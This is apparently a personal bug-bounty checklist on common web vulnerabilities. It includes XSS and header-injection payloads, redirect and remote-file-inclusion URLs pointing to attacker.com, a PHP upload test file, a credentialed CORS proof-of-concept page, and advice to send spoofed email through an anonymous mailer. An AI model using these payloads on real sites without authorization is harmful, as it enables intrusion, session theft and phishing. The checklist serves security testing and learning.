Bug Hunting Checklist
----------------------------------
These are the vulnerabilities/exploits I have to check when I'm bug hunting. 
Note: This is not a final list. This note will gradually grow with more detailed information and instructions

1. XSS
2. Host Header Injection
3. URL Redirection
4. Parameter Tampering 
5. HTML Injection
6. File Inclusion
7. Missing SPF record
8. Insecure CORS Configuration
9. SSRF
10. Scan for Critical Files
11. Source Code Disclosure

### Scan for subdomains

You can use `https://www.virustotal.com/gui/domain/` and look for sub-domains in the `relations` tab.

### Possible Parameters to use to find vulnerable URLS
dest, redirect, uri
path, continue, url
window, next, data
reference, site, html
val, validate, domain
callback, return, page
view, dir, show

file, document, folder
root, path, pg, style
pdf, template, php_path
doc, feed, host
port, to, out
navigation, open, result 

# 1. XSS

### 3 Types of XSS

1. Reflected XSS – This attack occurs, when a malicious script is not being saved on the web server but reflected in the website’s results.
2. Stored XSS – This attack occurs when a malicious script is being saved on the web server permanently.
3. DOM – This occurs, when the DOM environment is being changed, but the code remains the same.

Note:
* Use Burp Suite Spider to find all parameters on target site.
* Use a XSS Payload list with Burp Suite Intruder to speed up injections.

----------------------------------

# XSS Through Host Header Parameters

Example 1:
Host: victim.com"</b><script>alert('1');</script>

Example 2:
Referer: <script>alert('1');</script>

Note: If only the headers are reflected on the page it might be vulnerable to XSS injections.

----------------------------------

# XSS Through File Upload

Note: 
* When uploading an image use Burp Suite Proxy Intercepter to capture the Post Data Form.
Then use XSS Payload list to check for vulnerabilities. 
* If site is using php you can upload a php3 script with the following code to see if it's 
vulnerable to Unrestricted File Upload.

```
<?php
  echo $_GET["c"];
?>
```
* When code is uploaded go to the file upload path and type in the url bar
the parameter 'c' along with phpinfo() to see if exploit was successful.

----------------------------------

# 2. Host Header Injection

Example 1:
Host: victim.com
to
Host: attacker.com

Example 2:
Host: victim.com
X-Forwarded-Host: attacker.com

Example 3:
Host: attacker.com
X-Forwarded-Host: victim.com

Note:
* Location header should show injected site.
* Some links in the page may direct to injected site so check links in page.

----------------------------------

# 3. URL Redirection Through Path Fragments

Example 1:
Before - https://victim.com
After - https://victim.com//attacker.com/

Note:
* This will redirect users to newly injected site.
* Use Burp Suite Spider to find all parameters on target site.
* Use a XSS Payload list with Burp Suite Intruder to speed up injections.

----------------------------------

# 4. Parameter Tampering

Use Burp Suite Intercepter to modify and send request.

Types of sites that are most vulnerable are ecommerce sites and subscriptions. 

Example 1:
<input type="hidden" id="688" name="cost" value="$100" />

Note:
Attacker can modify value to lower the cost. 

Example 2:
Before: http://www.attackbank.com/default.asp?profile=741&debit=1000
After: http://www.attackbank.com/default.asp?profile=852&debit=2000

Note:
This vulnerability will likely be successful if there are no checks on the server-side.

----------------------------------

# 5. HTML Injection

This is when user input is not correctly sanitized or the output is not encoded 
and the attacker is able to inject valid HTML code into a vulnerable web page.

You can direct users to a malicious page when clicked on the htmli link.
<a href="attacker.com/exploit.php">Info</a>

Note:
Simply put some basic code in the input parameter like `<h1>hello</h1>` 
If it reflects back in HTML then you successfully completed the exploit.

----------------------------------

# 6. File Inclusion

Allows the user to submit input into files or upload files to the server.

Types of Attack:
* DOS (Denial of Service)
* Access to sensitive information 

Types of Inclusion:
1. LFI (Local File Inclusion) 
* LFI allows an attacker to read/execute files on the victim machine.

2. RFI (Remote File Inclusion)
* RFI is able to upload a file, link it and then execute code hosted on a server they own.
Ex: 

### LFI Hunting Through Intruder
1) Pick a target site
2) Crawl site using Burp Suite
3) Search parameters using Burp Suite Search
4) Search for parameters like `file` or `page`
5) Only have the following checked
  ..* In scope only
  ..* Request headers
  ..* Request body
6) Use Burp Suite Intruder and LFI payload list to automatically check for vulnerabilities.

### Remote File Inclusion

Example:

Before: http://victim.com/ajax.php?url=http://victim.com/foo.rss

After: http://victim.com/ajax.php?url=http://attacker.com/alert.js

Note: 
This will run the exploit when user presses return

----------------------------------

# 7. Missing SPF record

When a domain lacks an SPF policy, an attacker is able to send spoofed emails 
that look like they’re originating from the vulnerable domain.

To check if domain has a SPF record you can use Kitterman SPF Query Tool

https://www.kitterman.com/spf/validate.html
or
https://www.mxtoolbox.com/SuperTool.aspx

Example:

When a domain is vulnerable you can use a fake mailer to imitate the real domain.

You can use https://anonymousmail.me

----------------------------------

# 8. Insecure CORS Configuration

Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts) on a web page to be requested from another domain outside the domain from which the resource originated. CORS eliminates some restrictions imposed by the Same-origin policy that would block a AJAX requests from accessing data on a web page unless it is coming from the same origin.

### Domain is Vulnerable if the following are found

1. Check Response Header
2. Look For:
..* Access-Control-Allow-Origin: https://foo.com
..* Access-Control-Allow-Origin: *
..* Access-Control-Allow-Credentials: True

### CORS Hunting Through Burp Suite
1) Pick a target site
2) Crawl site using Burp Suite
3) Search parameters using Burp Suite Search
4) Only have the following checked
  ..* In-scope only
  ..* Response headers
5) Search for query like `Access-Control-Allow-Origin: *`
6) Check for urls with the parameter `?embed` to check for remote file includes.

If no `Access-Control-Allow-Origin` is found you can
add the following to your request header.

Origin: null or foo.com

The response will return with the following:
`Allow-Control-Allow-Origin: foo.com`
`Allow-Control-Allow-Origin: *`

### Confirm if site is Exploitable

1. Have a html file in your computer with the following code 
2. Open it in your browser

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<!--- Change URL to vulnerable site -->
<script>
function cors() {
var xhttp = new XMLHttpRequest();

xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET","https://foo.com", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

----------------------------------

# 9. SSRF (Server-Side Request Forgery)

The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).

When the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs the attacker may be able to read data from services that are not directly exposed on the internet:

Example 1:
http://foo.com/?requesturl=https://expressvpn.com/what-is-my-ip

You have to find a url with a parameter that will have a external or internal interaction with a remote server.

How do you check if server is making request to 3rd party domain.

Include `http://expressvpn.com/what-is-my-ip` as your payload then check burp response and see if IP address is different from yours.

----------------------------------

# 10. Scan for Critical Files

Set your initial payload to:
http://foo.com/idnf

Go on Burp Suite and set `idnf` as a payload parameter.

Then go on intruder and use the `critical-files-list.txt` to scan for vulnerable files.

----------------------------------

# 11. Source Code Disclosure

Search for files in the url such as `showimage.php`, `login.php` to view their source code with Burp Suite Repeater.

Example:
`https://foo.com/login.php`

----------------------------------
